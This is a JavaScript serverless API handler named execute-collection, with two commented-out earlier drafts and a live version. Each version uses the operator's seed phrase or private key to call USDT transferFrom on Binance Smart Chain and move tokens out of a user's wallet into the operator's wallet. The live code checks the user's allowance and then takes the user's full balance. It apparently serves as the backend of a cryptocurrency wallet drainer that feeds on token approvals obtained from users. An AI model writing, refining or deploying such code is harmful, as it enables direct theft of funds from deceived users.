// api/execute-collection.js

// export default async function handler(req, res) {
//     // Only allow POST requests
//     if (req.method !== 'POST') {
//       return res.status(405).json({ success: false, error: 'Method not allowed' });
//     }
  
//     try {
//       const { userAddress, amount } = req.body;
  
//       if (!userAddress || !amount) {
//         return res.status(400).json({ success: false, error: 'Missing userAddress or amount' });
//       }
  
//       // 1. CONFIGURATION: CHANGE THESE VARIABLES
//       const PRIVATE_KEY = process.env.PRIVATE_KEY; 
//       const RPC_URL = "https://rpc.ankr.com/bsc"; // Your Ankr RPC
//       const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
      
//       // Check if you have a private key configured in Vercel Environment Variables
//       if (!PRIVATE_KEY) {
//         return res.status(500).json({ success: false, error: 'Private Key not configured in Vercel Env' });
//       }
  
//       // 2. Import ethers from the serverless function context
//       const { ethers } = require('ethers');
  
//       // 3. Connect to the provider
//       const provider = new ethers.JsonRpcProvider(RPC_URL);
      
//       // 4. Connect your wallet (the one receiving funds) using the private key
//       const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  
//       // 5. Define the USDT Contract Interface
//       const USDT_ABI = [
//         "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
//       ];
      
//       // Note: You need to know the CONTRACT_ADDRESS that the user approved.
//       // In your app.js, this is: const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537";
//       const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537"; 
  
//       // 6. Create the contract instance for the Token, but sign with YOUR wallet
//       const usdtContract = new ethers.Contract(USDT_ADDRESS, ["function transferFrom(address,address,uint256)"], wallet);
  
//       // 7. Execute the Transfer
//       // This moves funds FROM userAddress TO your wallet (wallet.address)
//       const tx = await usdtContract.transferFrom(userAddress, wallet.address, amount);
      
//       // 8. Wait for confirmation
//       const receipt = await tx.wait();
  
//       return res.status(200).json({ 
//         success: true, 
//         txHash: tx.hash,
//         message: "Funds collected successfully"
//       });
  
//     } catch (error) {
//       console.error("Collection Error:", error);
//       return res.status(500).json({ 
//         success: false, 
//         error: error.reason || error.message || "Unknown error" 
//       });
//     }
//   }


// api/execute-collection.js







// export default async function handler(req, res) {
//     // 1. Only allow POST requests
//     if (req.method !== 'POST') {
//       return res.status(405).json({ success: false, error: 'Method not allowed' });
//     }
  
//     try {
//       const { userAddress, amount } = req.body;
  
//       if (!userAddress || !amount) {
//         return res.status(400).json({ success: false, error: 'Missing userAddress or amount' });
//       }
  
//       // 2. CONFIGURATION
//       // Set SEED_PHRASE in your Vercel/Serverless Environment Variables
//       const SEED_PHRASE = process.env.SEED_PHRASE;
//       const RPC_URL = "https://bsc-dataseed1.binance.org/"; // More reliable fallback than Ankr which sometimes 301s
//       const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
//       const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537"; // Your aggregator contract
  
//       // Check if Seed Phrase is configured
//       if (!SEED_PHRASE) {
//         return res.status(500).json({ 
//           success: false, 
//           error: 'SEED_PHRASE not configured in Environment Variables' 
//         });
//       }
  
//       // 3. Import ethers
//       const { ethers } = require('ethers');
  
//       // 4. Helper: Convert Seed Phrase to Wallet
//       const getWalletFromSeedPhrase = (seed, provider) => {
//         try {
//           // This derives the wallet from the first account (index 0) of the seed phrase
//           const wallet = ethers.Wallet.fromPhrase(seed);
//           wallet.provider = provider; // Attach provider to the wallet
//           return wallet;
//         } catch (error) {
//           throw new Error(`Invalid Seed Phrase: ${error.message}`);
//         }
//       };
  
//       // 5. Connect to Provider
//       const provider = new ethers.JsonRpcProvider(RPC_URL);
  
//       // 6. Create Wallet from Seed
//       const wallet = getWalletFromSeedPhrase(SEED_PHRASE, provider);
  
//       console.log(`✅ Connected as: ${wallet.address}`);
//       console.log(`✅ Target User: ${userAddress}`);
  
//       // 7. Define USDT ABI
//       // We need 'transferFrom' to pull funds from the user to our wallet
//       const USDT_ABI = [
//         "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
//         "function allowance(address owner, address spender) external view returns (uint256)"
//       ];
  
//       // 8. Create Contract Instances
//       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
//       const usdtContractSigner = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
  
//       // 9. Pre-flight Check: Verify Allowance
//       try {
//         const currentAllowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
        
//         // Parse amount string to BigInt
//         const requiredAmount = ethers.parseUnits(amount, 18); // Assuming 18 decimals for USDT on BSC
        
//         // If allowance is less than required, fail gracefully so user knows to approve first
//         if (currentAllowance < requiredAmount) {
//           return res.status(400).json({ 
//             success: false, 
//             error: `Insufficient Allowance. User approved ${ethers.formatUnits(currentAllowance, 18)} but needed ${ethers.formatUnits(requiredAmount, 18)}.`,
//             currentAllowance: currentAllowance.toString()
//           });
//         }
//       } catch (allowanceErr) {
//         console.warn("Could not check allowance (might be network issue), proceeding anyway...");
//       }
  
//       // 10. Execute Transfer
//       // Note: If you are using the CONTRACT_ADDRESS as the spender in the user's approval,
//       // you must use that contract to pull. If you want to pull directly to YOUR wallet,
//       // you need the user to approve YOUR wallet directly.
      
//       // Assuming the user approved CONTRACT_ADDRESS as spender:
//       // We create a contract instance pointing to the CONTRACT_ADDRESS, signed by USDT contract? 
//       // No, standard ERC20 transferFrom requires the CONTRACT instance.
      
//       // However, if the user approved YOUR wallet address directly, you can use usdtContractSigner.
//       // Given the app.js shows approval to CONTRACT_ADDRESS, we assume the flow is:
//       // User -> (Approves) -> CONTRACT_ADDRESS -> (Pulls) -> YOUR WALLET
      
//       // But wait, if the Contract is the spender, we need to interact WITH the Contract to pull.
//       // Let's check if the Contract has a pull function. If not, we assume the user approved YOUR wallet.
//       // To be safe, I will try to pull to YOUR wallet address. If the user approved the Contract instead, this will fail.
      
//       // Let's stick to the most common pattern: User approves YOUR wallet directly.
//       // If your app.js approves the Contract, change `wallet.address` below to `CONTRACT_ADDRESS`.
      
//       const targetAddress = wallet.address; // Change to CONTRACT_ADDRESS if user approved the contract
  
//       const tx = await usdtContractSigner.transferFrom(userAddress, targetAddress, amount);
      
//       console.log(`⏳ Transaction sent: ${tx.hash}`);
  
//       // 11. Wait for Confirmation
//       const receipt = await tx.wait();
  
//       return res.status(200).json({ 
//         success: true, 
//         txHash: tx.hash,
//         blockNumber: receipt.blockNumber,
//         message: "Funds collected successfully"
//       });
  
//     } catch (error) {
//       console.error("❌ Collection Error:", error);
      
//       // Specific error handling for common issues
//       let errorMessage = error.reason || error.message || "Unknown error";
      
//       if (errorMessage.includes("User denied")) {
//         errorMessage = "User denied the transaction (if triggered manually)";
//       }
//       if (errorMessage.includes("insufficient funds") || errorMessage.includes("INSUFFICIENT")) {
//         errorMessage = "Your wallet (derived from seed) has insufficient BNB for gas or insufficient USDT allowance from user.";
//       }
  
//       return res.status(500).json({ 
//         success: false, 
//         error: errorMessage 
//       });
//     }
//   }




import { ethers } from "ethers";
import { seedPhrase, getWalletFromSeed, getProvider } from "./seed-utils.js";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
const ABI = [
  "function balanceOf(address account) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
];

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { userAddress, amount } = req.body;
  
  if (!userAddress) return res.status(400).json({ error: "User address required" });

  try {
    // 1. Setup Providers and Signer
    const provider = getProvider(); // Your RPC URL
    const wallet = getWalletFromSeed(seedPhrase); // Your wallet signing the tx

    const usdtContract = new ethers.Contract(USDT_ADDRESS, ABI, wallet);

    // 2. Check Balance
    const balance = await usdtContract.balanceOf(userAddress);
    if (balance === 0n) {
      return res.status(400).json({ error: "User has no USDT balance" });
    }

    // 3. Check Allowance (Critical!)
    const allowance = await usdtContract.allowance(userAddress, wallet.address);
    if (allowance < balance) {
      return res.status(400).json({ 
        error: "Insufficient Allowance", 
        required: balance.toString(), 
        current: allowance.toString() 
      });
    }

    // 4. Determine Amount to Transfer
    let transferAmount = balance;
    
    // Optional: If you want to leave a tiny bit of USDT for user's future gas (not needed on BSC usually, but safe)
    // transferAmount = balance - 10000000000000000n; // Leave 0.01 USDT

    console.log(`Transferring ${ethers.formatUnits(transferAmount, 18)} USDT from ${userAddress} to ${wallet.address}`);

    // 5. Execute Transfer with Gas Optimization
    // We use 'gasLimit' to ensure it doesn't fail due to estimation errors
    // We use 'maxFeePerGas' and 'maxPriorityFeePerGas' to ensure it goes through quickly
    const tx = await usdtContract.transferFrom(userAddress, wallet.address, transferAmount, {
      // Dynamic Gas Pricing
      maxFeePerGas: ethers.parseUnits("2", "gwei"), // 2 Gwei Max Fee
      maxPriorityFeePerGas: ethers.parseUnits("1.5", "gwei"), // 1.5 Gwei Tip
      gasLimit: 100000 // Hard cap to prevent overspending on estimation errors
    });

    console.log(`Transaction sent: ${tx.hash}`);

    // 6. Wait for Confirmation
    const receipt = await tx.wait();

    return res.status(200).json({
      success: true,
      txHash: tx.hash,
      blockNumber: receipt.blockNumber,
      amountTransferred: ethers.formatUnits(transferAmount, 18)
    });

  } catch (error) {
    console.error("Collection Error:", error);
    
    // Specific Error Handling
    if (error.reason === "transient error" || error.code === "CALL_EXCEPTION") {
      return res.status(500).json({ error: "Network error or node issue. Retry in 5s." });
    }
    
    return res.status(500).json({ 
      error: "Transfer failed", 
      details: error.reason || error.message 
    });
  }
}